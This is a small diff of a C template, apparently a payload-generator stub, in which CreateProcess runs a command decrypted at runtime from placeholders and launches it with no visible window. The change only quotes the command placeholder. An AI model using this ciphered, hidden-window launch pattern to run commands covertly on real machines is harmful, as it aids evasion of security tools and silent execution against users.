@@ -22,7 +22,7 @@ int main(int argc, char **argv)
 	memset(&p_info, 0, sizeof(p_info));
 	s_info.cb = sizeof(s_info);
 
-	if (CreateProcess(NULL, cipher(#COMMAND, "#KEY", #LENGTH), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &s_info, &p_info))
+	if (CreateProcess(NULL, cipher("#COMMAND", "#KEY", #LENGTH), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &s_info, &p_info))
 	{
 		CloseHandle(p_info.hProcess);
 		CloseHandle(p_info.hThread);
